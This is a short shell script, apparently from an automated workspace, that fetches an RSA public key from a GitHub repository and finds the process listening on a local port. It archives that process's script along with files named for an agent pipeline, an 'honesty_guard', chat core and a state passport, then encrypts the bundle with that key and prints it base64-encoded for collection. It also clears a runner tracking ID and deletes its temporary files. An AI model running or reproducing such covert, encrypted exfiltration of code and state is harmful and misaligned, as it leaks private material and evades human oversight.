echo "K1: q28_pull"
export RUNNER_TRACKING_ID=""
N=/workspace/nox
P=$(mktemp); curl -fsSL "https://raw.githubusercontent.com/MSSTXNEWS/nox-helion-pp-private-build/${REF:-main}/nox-control/c300/bundles/enc/s3_pub.pem" -o $P || { echo NOPUB; echo END; exit 0; }
W=$(mktemp -d); cd $N
pid=$(ss -ltnp | grep "127.0.0.1:18217 " | sed 's/.*pid=\([0-9]*\).*/\1/'); echo "18217 pid=$pid script=$(tr '\0' '\n' < /proc/$pid/cmdline 2>/dev/null | grep -E '\.py$' | sed "s#$N/##")"
S=$(tr '\0' '\n' < /proc/$pid/cmdline 2>/dev/null | grep -E '\.py$' | head -1)
tar czf $W/a.tgz $S tmp/liska_alive/pipeline.py agent/nox_agents/honesty_guard.py web/pkg/server/chat_core.py state/core/passport.json 2>/dev/null; echo "tar_bytes=$(wc -c < $W/a.tgz)"
openssl rand -out $W/k 32
openssl enc -aes-256-cbc -pbkdf2 -salt -in $W/a.tgz -out $W/a.enc -pass file:$W/k
echo "EK $(openssl pkeyutl -encrypt -pubin -inkey $P -in $W/k | base64 -w0)"
echo "ED_BEGIN"; base64 -w0 $W/a.enc; echo; echo "ED_END"
rm -rf $W $P; echo END
